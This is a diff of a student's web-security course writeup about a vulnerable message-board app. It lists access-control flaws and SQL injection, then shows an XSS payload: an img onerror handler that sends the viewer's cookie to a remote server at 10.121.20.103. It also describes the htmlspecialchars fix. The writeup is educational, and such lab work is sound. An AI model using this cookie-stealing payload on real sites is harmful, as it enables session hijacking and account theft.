@@ -1,4 +1,12 @@
-#Part 1.
+# Project Writeup
+
+Bradley Rosenfeld
+
+COS342
+
+11/14/15
+
+## Part 1.
 
 1. The application tries to prevent access to messages by checking for the existence of a cookie that is created when the user is authenticated and logged in. Messages can be deleted by visiting a GET URL, the link to which is only visible when the user who is viewing the message has a cookie that matches the user who created the message. Even worse, the deletion action is vulnerable to SQL injection which would allow any user to delete any post or worse.
 
@@ -18,7 +26,7 @@
 
 5. No password scheme was implemented, users could submit anything as a password.
 
-#Part 2
+## Part 2
 
 The attacker could post an image that fails to load, forcing JS to run. In this case, I wrote a simple script that sends the user's cookie to the remote server.
 
@@ -26,7 +34,7 @@ The attacker could post an image that fails to load, forcing JS to run. In this 
 <img src="fdfjkdfjfkjdfdf.dfdjf" onerror="this.src=\'http://10.121.20.103/hackme-xss.php?c=\' + document.cookie">
 ```
 
-You can view the result of this attack by visiting http://10.121.20.103/hackme-xss.php.
+If you're on the Taylor University network, you can view the result of this attack by visiting [http://10.121.20.103/hackme-xss.php](10.121.20.103/hackme-xss.php)
 
 In order to fix this, I disabled all usage of HTML in messages by using the `htmlspecialchars` function in PHP when rendering the user submitted content.
 
